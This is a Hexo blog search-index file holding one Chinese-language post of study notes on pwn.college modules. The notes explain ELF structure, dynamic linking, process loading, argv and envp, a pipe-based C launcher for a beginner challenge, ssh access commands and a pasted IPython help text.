<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>pwn.college各modules的一点笔记</title>
    <link href="/2022-01/pwn-modules/"/>
    <url>/2022-01/pwn-modules/</url>
    
    <content type="html"><![CDATA[<h1 id="module-1"><a href="#module-1" class="headerlink" title="module 1"></a>module 1</h1><h2 id="The-file-system"><a href="#The-file-system" class="headerlink" title="The file system"></a>The file system</h2><p><img src="../../image/pwn-modules/image-20220117165401525.png" alt="image-20220117165401525"></p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ln -s /old/path /new/path<br>&lt;in_file:      redirect in_file into the command&#x27;s input<br><span class="hljs-meta">&gt;</span><span class="bash">out_file:     redirect the <span class="hljs-built_in">command</span><span class="hljs-string">&#x27;s output into out_file, overwriting it</span></span><br><span class="hljs-meta">&gt;</span><span class="bash"><span class="hljs-string">&gt;out_file:    redirect the command&#x27;</span>s output into out_file, appending to it</span><br><span class="hljs-meta">2&gt;</span><span class="bash">error_file:  redirect the <span class="hljs-built_in">command</span><span class="hljs-string">&#x27;s errors into error_file, overwriting it</span></span><br><span class="hljs-meta">2&gt;</span><span class="bash"><span class="hljs-string">&gt;error_file: redirect the command&#x27;</span>s errors into error_file, appending to it</span><br></code></pre></div></td></tr></table></figure><h2 id="Binary-files"><a href="#Binary-files" class="headerlink" title="Binary files"></a>Binary files</h2><blockquote><p>pwn.college的教程还是挺绝的, slide可以做为基础知识的详细参考资料. Binaryfiles的slide在<a href="https://docs.google.com/presentation/d/1wrX8tvwaxIEk5hx4OtQmPqps-MScIaDO-9bTKQqr8vI/edit#slide=id.g9265d66f8d_0_26">这里</a> </p><p><a href="https://www.intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/">ELF base struct: header-sections-segments</a><br><a href="https://www.intezer.com/blog/elf/executable-linkable-format-101-part-2-symbols/">symbols</a><br><a href="https://www.intezer.com/blog/elf/executable-and-linkable-format-101-part-3-relocations/">relocations</a><br><a href="https://www.intezer.com/blog/elf/executable-linkable-format-101-part-4-dynamic-linking/">dynamic-linking</a> </p></blockquote><ul><li>ELF is a binary file format.<br>  Contains the program and its data.Describes how the program should be loaded (<em>program/segment headers</em>).Contains metadata describing program components (<em>section headers</em>).</li><li><strong>sections</strong> gather all needed information to link a given object file and build an executable,<br>  while <strong>Program Headers</strong> split the executable into segments with different attributes, which will eventually be loaded into memory.</li><li>Section headers are <em><strong>not</strong></em> a necessary part of the ELF. <em>Section headers</em> are just <strong>metadata</strong>.</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> file /bin/cat</span> <br>/bin/cat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e6afa43e1e280bd06c018f541c7ae46a2ebda83c, for GNU/Linux 3.2.0, stripped<br></code></pre></div></td></tr></table></figure><ul><li>Several ways to dig in: 在CSAPP里, 当初看的时候被我忽略掉了…<ul><li><input checked="" disabled="" type="checkbox"> <strong>gcc</strong> to make your ELF.</li><li><input checked="" disabled="" type="checkbox"> <strong>readelf</strong> to parse the ELF header.</li><li><input checked="" disabled="" type="checkbox"> <strong>objdump</strong> to parse the ELF header and disassemble the source code.</li><li><input checked="" disabled="" type="checkbox"> <strong>nm</strong> to view your ELF’s symbols.</li><li><input disabled="" type="checkbox"> <strong>patchelf</strong> to change some ELF properties.</li><li><input checked="" disabled="" type="checkbox"> <strong>objcopy</strong> to swap out ELF sections.</li><li><input disabled="" type="checkbox"> <strong>strip</strong> to remove otherwise-helpful information (such as symbols).</li><li><input disabled="" type="checkbox"> <strong>kaitai struct</strong> (<a href="https://ide.kaitai.io/">https://ide.kaitai.io/</a>) to look through your ELF interactively</li></ul></li></ul><h3 id="ELF-base-struct"><a href="#ELF-base-struct" class="headerlink" title="ELF base struct"></a>ELF base struct</h3><p>ELF files are composed of three major components:</p><ul><li><strong>ELF Header</strong> : contains general information about the binary <code>readelf -h &lt;executable&gt;</code> </li><li><strong>Sections</strong> : comprise all information needed for linking a target object file in order to build a working executable <code>readelf -S &lt;executable&gt;</code></li><li><strong>Segments</strong> : break down the structure of an ELF binary into suitable chunks to prepare the executable to be loaded into memory</li></ul><blockquote><p>每个section的意义还是要注意一下, 我又倒回来看.got.plt了</p></blockquote><p>注意segment在链接的时候没有作用, section在运行时没有作用.</p><p>一方面Segment通过把section分组来提高装载的效率, 另一方面要注意必须和物理页大小对齐, 以便于pte中的权限控制.</p><h3 id="Symbols"><a href="#Symbols" class="headerlink" title="Symbols"></a>Symbols</h3><p><strong>Provide interface to Linkers and Debuggers to enforce their functionality.</strong> </p><p>.dynstr是.dynsym的string table, The section <em>.strtab</em> is the <em>String Table</em> of <em>.symtab Symbol Table</em>. 而且string table的entry数量和symbol table的entry数量一致.</p><p><img src="../../image/pwn-modules/photo_2018-01-13_11-28-32.jpg"></p><h3 id="relocation"><a href="#relocation" class="headerlink" title="relocation"></a>relocation</h3><ol><li><strong>Defining Relocations</strong> </li></ol><p>There are different types of <u>relocatable files</u>:</p><ul><li>Generic object files (*.o).     比较简单, 就是一个静态链接的文件.</li><li>Kernel object files (*.ko).     wait for future</li><li>Shared object files (*.so).    <ul><li>These type of relocatable files support being linked on runtime, and they may be shared across different processes. Consequently, relocations of dynamic dependencies have to be done at runtime. This process is known as Dynamic Linking.</li></ul></li></ul><p>Elfxx_Rel and Elfxx_Rela差在一个Addend上, 也就是要重定位的位置和下一条指令地址的差值<strong>取反</strong>.</p><p>其他的部分看原博客<a href="https://www.intezer.com/blog/malware-analysis/executable-and-linkable-format-101-part-3-relocations/">就行</a>, 东西太多必须每一段意思都要懂, 不过重定位条目比较少也容易记住.</p><h3 id="Dynamic-Linking"><a href="#Dynamic-Linking" class="headerlink" title="Dynamic Linking"></a>Dynamic Linking</h3><h4 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h4><p>Unlike in static linking, <em><strong>ld</strong></em> requires shared libraries to create a dynamically linked executable.<br>The output file will contain the <strong>executable’s code</strong> and <strong>the names of the shared libraries</strong> required.</p><p>When the binary is executed, the dynamic linker will find the required dependencies to <strong>load</strong> and link them together.</p><h4 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h4><p>The dynamic linking process begins immediately after execution.</p><p>With dynamically linked programs, the system executes the file’s “<strong>interpreter</strong>”, which is an <u>intermediate</u> program that should <strong>set up the environment and only then execute the main binary</strong>. The interpreter lies in the <em>PT_INTERP</em> segment created by the compile-time linker (<em><strong>ld</strong></em>).</p><p>The dynamic linker will <strong>set up the environment</strong> <u>using dynamic entries</u> from the <em>.dynamic</em> section:</p><p>preparing the environment:</p><ol><li>Load the original file’s PT_LOAD segments in memory.</li><li>Use the <em>.dynamic</em> section/segment to read dependencies, search for them on disk and load them in memory as well. This is done recursively for dependent libraries—they can be dynamically linked as well. The dependency searching algorithm is outlined in the <a href="http://man7.org/linux/man-pages/man8/ld.so.8.html">ld.so man page</a>.</li><li>Perform relocations – shared libraries are loaded into non-deterministic addresses and must have absolute addresses patched, as well as resolving references to other object files.</li><li>Invoke shared library initialization functions (registered in the <em>.preinit_array, .init, .init_array</em> sections). <strong>What happened?</strong> </li><li>Finally, pass control back to the original binary’s entry point, making it seem to the binary that control was passed directly from <em>exec</em>.</li></ol><p>还讲到了<strong>LD_PRELOAD</strong>和<strong>LD_LIBRARY_PATH</strong>变量…还是看原文吧…</p><h4 id="Lazy-Linking"><a href="#Lazy-Linking" class="headerlink" title="Lazy Linking"></a>Lazy Linking</h4><p>lazy linking的原因是如果一个程序开头出错了马上退出, rendering useless all of the relocation work performed by the dynamic linker, 所以将一些链接工作放到实际调用的时候.</p><p>在CSAPP中看过了, 基本相同, 不同在于提供了IDA的视图看法.</p><h2 id="Process-Loading"><a href="#Process-Loading" class="headerlink" title="Process Loading"></a>Process Loading</h2><ol><li><p>A process is created.</p><p> by fork() or clone() and execve().</p></li><li><p>Cat is loaded.</p><ul><li><p>must be executable</p><p>To figure out what to load, the Linux kernel reads the beginning of the file (i.e., /bin/cat), and makes a decision:</p></li><li><p>If the file starts with <strong>#!</strong>, the kernel extracts the interpreter from the rest of that line and executes this interpreter with the original file as an argument.</p></li><li><p>If the file matches a format in <strong>/proc/sys/fs/binfmt_misc</strong>, the kernel executes the interpreter specified for that format with the original file as an argument.</p></li><li><p>If the file is a <strong>dynamically-linked</strong> ELF, the kernel reads the interpreter/loader defined in the ELF, loads the interpreter and the original file, and lets the interpreter take control.</p></li><li><p>If the file is a <strong>statically-linked</strong> ELF, the kernel will load it.Other legacy file formats are checked for</p><p>notice the interpreter specified in .interp section.</p><p><strong>Dynamically linked ELFs: the loading process</strong> </p></li><li><p>The program and its interpreter are <u>loaded by the kernel</u>.</p></li><li><p>The interpreter <u>locates the libraries</u>.<br>  a. LD_PRELOAD environment variable, and anything in /etc/ld.so.preload<br>  b. LD_LIBRARY_PATH environment variable (can be set in the shell)<br>  c. DT_RUNPATH or DT_RPATH specified in the binary file (both can be modified with patchelf)<br>  d.system-wide configuration (/etc/ld.so.conf)<br>  e. /lib and /usr/lib</p></li><li><p>The interpreter <u>loads the libraries</u>.<br>  a.  these libraries can depend on other libraries, causing more to be loadedb.relocations updated</p></li></ul></li><li><p><a href="https://docs.google.com/presentation/d/1TwM5WLWnTqrNkpXjGKkaXYbKZEpatEQYA7ckBVXAOhs/edit#slide=id.g40953d030c_0_179">Cat is initialized</a>.</p><p> <strong>/proc/self/maps</strong> and <strong>attribute((constructor))</strong> </p></li></ol><p>Further readings:</p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-4.html">How does the Linux kernel run a program</a> </p><p><a href="https://gist.github.com/CMCDragonkai/10ab53654b2aa6ce55c11cfc5b2432a4">Linux: Understanding the Memory Layout of Linux Executables</a> </p><h2 id="Process-Execution"><a href="#Process-Execution" class="headerlink" title="Process Execution"></a>Process Execution</h2><p>用命令行演示了非常多的内容, 基本都没见过我尽量记录下一些细节. <a href="https://docs.google.com/presentation/d/1ezY9Q8I0tzDD-7ZDXMbQM5RQ7z1dvB9-U_nDEhc6qdE/edit#slide=id.g9279416eed_1_114">谷歌文档</a> </p><ol><li>Cat is launched.</li><li>Cat reads its arguments and environment.</li><li>Cat does its thing.</li><li>Cat terminates. </li></ol><p>上面四个是这一部分要考虑的流程, 我也按流程走:</p><h3 id="Cat-is-launched"><a href="#Cat-is-launched" class="headerlink" title="Cat is launched"></a>Cat is launched</h3><p><code>__libc_start_main()</code>, 又是这个函数, 不过在这之前还有一个<code>_start()</code>, 形成<code>_start()-&gt;__libc_start_main()-&gt;main()</code>流程.</p><blockquote><p>可以指定一下LD_PRELOAD参数来改变__libc_start_main()之类的操作</p></blockquote><h3 id="Cat-reads-arg-amp-env"><a href="#Cat-reads-arg-amp-env" class="headerlink" title="Cat reads arg &amp; env"></a>Cat reads arg &amp; env</h3><p>在下一节中有介绍, 视频里示范了一个改环境变量的例子.</p><p>在执行ls指令的时候 添加<code>LANG = C</code>环境变量, 会导致排序按照ASCII码, 否则会按照系统默认的<code>en_US-UTF-8</code> </p><h3 id="Cat-does-thing"><a href="#Cat-does-thing" class="headerlink" title="Cat does thing"></a>Cat does thing</h3><p>讲到了库函数, 系统调用, 信号, 共享内存. </p><p>通过nm指令来查看symbol, strace的使用, 以及libc库函数可以不用写头文件, 不过会引起一个隐式声明警告, 可以通过man来查看需要引用什么头文件. </p><p>信号演示的时候用了<code>ps pgrep</code>两个指令, 看ps的manual知道了参数有三种风格. 共享内存演示了/dev/shm, <strong>还不知道这怎么用</strong> </p><p>还有一个进程terminate, 和我在操作系统中看到的一致, 不重复了.</p><p>剩下的在PPT里.</p><h2 id="命令行参数和环境变量"><a href="#命令行参数和环境变量" class="headerlink" title="命令行参数和环境变量"></a>命令行参数和环境变量</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span></span><br></code></pre></div></td></tr></table></figure><p>main函数的参数, 其中argv和envp是字符串数组的指针, 所以是二重指针, 两个数组的最后一个元素是null.</p><p>就像这样子:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc -o <span class="hljs-built_in">test</span> test.c</span><br><span class="hljs-meta">$</span><span class="bash"> ./<span class="hljs-built_in">test</span> testing</span><br>The number of arguments is: 2<br><br>First arg:     The program name is: ./test<br>Second arg: The first argument is: testing<br><br>The first environment variable is: PWD=/home/yans # process working directory<br>The second environment variable is: SHLVL=1<br></code></pre></div></td></tr></table></figure><p><code>env</code> runs a command with a modified environment. 也可以设置特定的环境变量.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> env -i ./countenv</span>                   <br>There are 0 environment variables.<br></code></pre></div></td></tr></table></figure><h2 id="PIPE"><a href="#PIPE" class="headerlink" title="PIPE"></a>PIPE</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">subprocess</span> &#123;</span><br>    <span class="hljs-keyword">int</span> pid;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stdin</span>;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stdout</span>;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stderr</span>;<br>&#125;;<br><span class="hljs-keyword">void</span> __close(<span class="hljs-keyword">int</span> fd) &#123;<br>    <span class="hljs-keyword">if</span> (close(fd) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not close pipe end&quot;</span> ); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mk_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fds[<span class="hljs-number">2</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (pipe(fds) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not create pipe&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mv_fd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd1, <span class="hljs-keyword">int</span> fd2)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (dup2(fd1,  fd2) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not duplicate pipe end&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>    __close(fd1);<br>&#125;<br><br><span class="hljs-comment">// Start program at argv[0] with arguments argv.</span><br><span class="hljs-comment">// Set up new stdin, stdout and stderr.</span><br><span class="hljs-comment">// Puts references to new process and pipes into `p`.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">call</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* argv[], struct subprocess * p)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> child_in[<span class="hljs-number">2</span>]; <span class="hljs-keyword">int</span> child_out[<span class="hljs-number">2</span>]; <span class="hljs-keyword">int</span> child_err[<span class="hljs-number">2</span>];<br>    pipe(child_in); pipe(child_out); pipe(child_err);<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        __close(<span class="hljs-number">0</span>); __close(<span class="hljs-number">1</span>); __close(<span class="hljs-number">2</span>);                                 <span class="hljs-comment">// __close parent pipes</span><br>        __close(child_in[<span class="hljs-number">1</span>]); __close(child_out[<span class="hljs-number">0</span>]); __close(child_err[<span class="hljs-number">0</span>]); <span class="hljs-comment">// unused child pipe ends</span><br>        mv_fd(child_in[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>); mv_fd(child_out[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>); mv_fd(child_err[<span class="hljs-number">1</span>], <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">char</span>* envp[] = &#123; <span class="hljs-string">&quot;\0&quot;</span> &#125;;<br>        <span class="hljs-comment">//write(1,&quot;what the fuck&quot;, 30);</span><br>        <span class="hljs-keyword">int</span> r=execve(<span class="hljs-string">&quot;/challenge/embryoio_level40&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>        write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;failure in exec&quot;</span>, <span class="hljs-number">30</span>) ;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        __close(child_in[<span class="hljs-number">0</span>]); __close(child_out[<span class="hljs-number">1</span>]); __close(child_err[<span class="hljs-number">1</span>]); <span class="hljs-comment">// unused child pipe ends</span><br>        p-&gt;pid = pid;<br>        p-&gt;<span class="hljs-built_in">stdin</span> = child_in[<span class="hljs-number">1</span>];   <span class="hljs-comment">// parent wants to write to subprocess child_in</span><br>        p-&gt;<span class="hljs-built_in">stdout</span> = child_out[<span class="hljs-number">0</span>]; <span class="hljs-comment">// parent wants to read from subprocess child_out</span><br>        p-&gt;<span class="hljs-built_in">stderr</span> = child_err[<span class="hljs-number">0</span>]; <span class="hljs-comment">// parent wants to read from subprocess child_err</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello from parent process!\n&quot;</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">subprocess</span> <span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">char</span>* argv[] = &#123;<span class="hljs-string">&quot;/challenge/embryoio_level40&quot;</span>, <span class="hljs-string">&quot;\0&quot;</span>&#125;;<br>    call(argv, &amp;proc);<br><span class="hljs-comment">//    mv_fd(STDIN_FILENO, proc.stdin);</span><br><span class="hljs-comment">//    mv_fd(STDOUT_FILENO, proc.stdout);</span><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">2048</span>];<br>    <span class="hljs-keyword">char</span> buf_[<span class="hljs-number">2048</span>];<br>    read(proc.<span class="hljs-built_in">stdout</span>, buf, <span class="hljs-number">2048</span>);<br>    read(proc.<span class="hljs-built_in">stderr</span>, buf_,<span class="hljs-number">2048</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf_);<br>    waitpid(proc.pid);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p>真的是相当多, 见<a href="https://pwn.college/modules/interaction">这里</a> </p><p>有个<a href="https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf">pwntools-cheatsheet</a>比较特别, 应该能用上</p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><blockquote><p>怎么会有一百多个, 也太离谱了</p></blockquote><p>基本连接方式: ssh</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ssh-keygen -f pwnkey<br>cat pwnkey.pub #copy public key<br>ssh -i pwnkey hacker@dojo.pwn.college -v     <br></code></pre></div></td></tr></table></figure><p>在/challenge/[对应文件]中, 直接执行即可</p><ul><li>从远程机器复制文件:</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">scp -i pwnkey hacker@dojo.pwn.college:/challenge/checker.py ./<br></code></pre></div></td></tr></table></figure><h3 id="level-几来着"><a href="#level-几来着" class="headerlink" title="level(几来着)"></a>level(几来着)</h3><p>要求以0个环境变量运行程序, 可以使用execve函数, env命令, exec命令三种方法</p><blockquote><p>其余的大概就是加环境变量, 加参数, 写在脚本里之类的简单题</p></blockquote><h3 id="level15新东西"><a href="#level15新东西" class="headerlink" title="level15新东西"></a>level15新东西</h3><p>新的一个东西: ipython, An enhenced interactive python, 增加了一些特别的功能, 还有个说明书放在本level的末尾.</p><p>ssh接上后, 进入ipython, 然后Ctrl+O就可以编辑多行脚本了, 使用的还是pwntools, 算是熟悉一点.</p><p>有两种方法: </p><ol><li><code>!exec /challenge/embryoio_level15</code> </li><li>用<code>pwn.process()</code> </li></ol><h4 id="Python-–-An-enhanced-Interactive-Python"><a href="#Python-–-An-enhanced-Interactive-Python" class="headerlink" title="Python – An enhanced Interactive Python"></a>Python – An enhanced Interactive Python</h4><p>IPython offers a fully compatible replacement for the standard Python<br>interpreter, with convenient shell features, special commands, command<br>history mechanism and output results caching.</p><p>At your system command line, type ‘ipython -h’ to see the command line<br>options available. This document only describes interactive features.</p><h5 id="GETTING-HELP"><a href="#GETTING-HELP" class="headerlink" title="GETTING HELP"></a>GETTING HELP</h5><p>Within IPython you have various way to access help:</p><p>  <strong>?         -&gt; Introduction and overview of IPython’s features (this screen).</strong><br>  object?   -&gt; Details about ‘object’.<br>  object??  -&gt; More detailed, verbose information about ‘object’.<br>  %quickref -&gt; Quick reference of all IPython specific syntax and magics.<br>  help      -&gt; Access Python’s own help system.</p><p>If you are in terminal IPython you can quit this screen by pressing <code>q</code>.</p><h5 id="MAIN-FEATURES"><a href="#MAIN-FEATURES" class="headerlink" title="MAIN FEATURES"></a>MAIN FEATURES</h5><ul><li><p>Access to the standard Python help with object docstrings and the Python<br>  manuals. Simply type ‘help’ (no quotes) to invoke it.</p></li><li><p>Magic commands: type %magic for information on the magic subsystem.</p></li><li><p>System command aliases, via the %alias command or the configuration file(s).</p></li><li><p>Dynamic object information:</p><p>  Typing ?word or word? prints detailed information about an object. Certain<br>  long strings (code, etc.) get snipped in the center for brevity.</p><p>  Typing ??word or word?? gives access to the full information without<br>  snipping long strings. Strings that are longer than the screen are printed<br>  through the less pager.</p><p>  The ?/?? system gives access to the full source code for any object (if<br>  available), shows function prototypes and other useful information.</p><p>  If you just want to see an object’s docstring, type ‘%pdoc object’ (without<br>  quotes, and without % if you have automagic on).</p></li><li><p><strong>Tab completion in the local namespace:</strong> </p><p>  At any time, hitting tab will complete any available python commands or<br>  variable names, and show you a list of the possible completions if there’s<br>  no unambiguous one. It will also complete filenames in the current directory.</p></li><li><p><strong>Search previous command history in multiple ways:</strong> </p><ul><li><p>Start typing, and then use arrow keys up/down or (Ctrl-p/Ctrl-n) to search<br>  through the history items that match what you’ve typed so far.</p></li><li><p>Hit Ctrl-r: opens a search prompt. Begin typing and the system searches<br>  your history for lines that match what you’ve typed so far, completing as<br>  much as it can.</p></li><li><p>%hist: search history by index.</p></li></ul></li><li><p><strong>Persistent command history across sessions.</strong></p></li><li><p>Logging of input with the ability to save and restore a working session.</p></li><li><p><strong>System shell with !. Typing !ls will run ‘ls’ in the current directory.</strong></p></li><li><p>The reload command does a ‘deep’ reload of a module: changes made to the<br>  module since you imported will actually be available without having to exit.</p></li><li><p>Verbose and colored exception traceback printouts. See the magic xmode and<br>  xcolor functions for details (just type %magic).</p></li><li><p>Input caching system:</p><p>  IPython offers numbered prompts (In/Out) with input and output caching. All<br>  input is saved and can be retrieved as variables (besides the usual arrow<br>  key recall).</p><p>  The following GLOBAL variables always exist (so don’t overwrite them!):<br>  _i: stores previous input.<br>  _ii: next previous.<br>  _iii: next-next previous.<br>  _ih : a list of all input _ih[n] is the input from line n.</p><p>  Additionally, global variables named _i<n> are dynamically created (<n><br>  being the prompt counter), such that _i<n> == _ih[<n>]</p><p>  For example, what you typed at prompt 14 is available as _i14 and _ih[14].</p><p>  You can create macros which contain multiple input lines from this history,<br>  for later re-execution, with the %macro function.</p><p>  The history function %hist allows you to see any part of your input history<br>  by printing a range of the _i variables. Note that inputs which contain<br>  magic functions (%) appear in the history with a prepended comment. This is<br>  because they aren’t really valid Python code, so you can’t exec them.</p></li><li><p>Output caching system:</p><p>  For output that is returned from actions, a system similar to the input<br>  cache exists but using _ instead of _i. Only actions that produce a result<br>  (NOT assignments, for example) are cached. If you are familiar with<br>  Mathematica, IPython’s _ variables behave exactly like Mathematica’s %<br>   variables.</p><p>  The following GLOBAL variables always exist (so don’t overwrite them!):<br>  _ (one underscore): previous output.<br>  __ (two underscores): next previous.<br>  ___ (three underscores): next-next previous.</p><p>  Global variables named _<n> are dynamically created (<n> being the prompt<br>  counter), such that the result of output <n> is always available as _<n>.</p><p>  Finally, a global dictionary named _oh exists with entries for all lines<br>  which generated output.</p></li><li><p>Directory history:</p><p>  Your history of visited directories is kept in the global list _dh, and the<br>  magic %cd command can be used to go to any entry in that list.</p></li><li><p>Auto-parentheses and auto-quotes (adapted from Nathan Gray’s LazyPython)</p><ol><li><p>Auto-parentheses</p><p> Callable objects (i.e. functions, methods, etc) can be invoked like<br> this (notice the commas between the arguments)::</p><div class="hljs code-wrapper"><pre><code> In [1]: callable_ob arg1, arg2, arg3</code></pre></div><p> and the input will be translated to this::</p><div class="hljs code-wrapper"><pre><code> callable_ob(arg1, arg2, arg3)</code></pre></div><p> This feature is off by default (in rare cases it can produce<br> undesirable side-effects), but you can activate it at the command-line<br> by starting IPython with <code>--autocall 1</code>, set it permanently in your<br> configuration file, or turn on at runtime with <code>%autocall 1</code>.</p><p> You can force auto-parentheses by using ‘/‘ as the first character<br> of a line.  For example::</p><div class="hljs code-wrapper"><pre><code>  In [1]: /globals             # becomes &#39;globals()&#39;</code></pre></div><p> Note that the ‘/‘ MUST be the first character on the line!  This<br> won’t work::</p><div class="hljs code-wrapper"><pre><code>  In [2]: print /globals    # syntax error</code></pre></div><p> In most cases the automatic algorithm should work, so you should<br> rarely need to explicitly invoke /. One notable exception is if you<br> are trying to call a function with a list of tuples as arguments (the<br> parenthesis will confuse IPython)::</p><div class="hljs code-wrapper"><pre><code>  In [1]: zip (1,2,3),(4,5,6)  # won&#39;t work</code></pre></div><p> but this will work::</p><p>and the input will be translated to this::</p><div class="hljs code-wrapper"><pre><code>callable_ob(arg1, arg2, arg3)</code></pre></div><p>This feature is off by default (in rare cases it can produce<br>undesirable side-effects), but you can activate it at the command-line<br>by starting IPython with <code>--autocall 1</code>, set it permanently in your<br>configuration file, or turn on at runtime with <code>%autocall 1</code>.</p><p>You can 